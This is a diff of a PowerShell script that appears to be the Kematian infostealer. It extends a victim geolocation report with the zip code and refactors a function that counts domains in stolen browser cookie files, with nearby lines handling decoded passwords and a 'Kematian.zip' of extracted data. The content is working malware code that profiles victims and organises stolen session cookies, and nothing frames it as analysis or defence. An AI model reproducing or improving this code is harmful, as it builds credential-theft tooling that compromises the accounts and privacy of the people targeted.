@@ -185,7 +185,7 @@ function Backup-Data {
         $lat = $response.lat
         $lon = $response.lon
         $isp = $response.isp
-        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nVPN/Proxy: $hosting"
+        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nZip: $zip `nVPN/Proxy: $hosting"
     }
 
     $networkinfo = Get-Network
@@ -869,29 +869,30 @@ Pass: $decodedPass
 	
     Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
 	
-	function Process-CookieFiles {
-    $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
-    $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
-    foreach ($file in $cookieFiles) {
-        $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
-        $fileContents = Get-Content -Path $file.FullName
-        $domainCounts = @{}
-        foreach ($line in $fileContents) {
-            if ($line -match "^\s*(\S+)\s") {
-                $domain = $matches[1].TrimStart('.')
-                if ($domainCounts.ContainsKey($domain)) {
-                    $domainCounts[$domain]++
-                } else {
-                    $domainCounts[$domain] = 1
+    function ProcessCookieFiles {
+        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
+        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
+        foreach ($file in $cookieFiles) {
+            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
+            $fileContents = Get-Content -Path $file.FullName
+            $domainCounts = @{}
+            foreach ($line in $fileContents) {
+                if ($line -match "^\s*(\S+)\s") {
+                    $domain = $matches[1].TrimStart('.')
+                    if ($domainCounts.ContainsKey($domain)) {
+                        $domainCounts[$domain]++
+                    }
+                    else {
+                        $domainCounts[$domain] = 1
+                    }
                 }
             }
+            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
+            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
+            Set-Content -Path $outputFilePath -Value $outputString
         }
-        $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
-        $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
-        Set-Content -Path $outputFilePath -Value $outputString
     }
-    }
-    Process-CookieFiles 
+    ProcessCookieFiles 
 	
     # Send info about the data in the Kematian.zip
     function kematianinfo {	
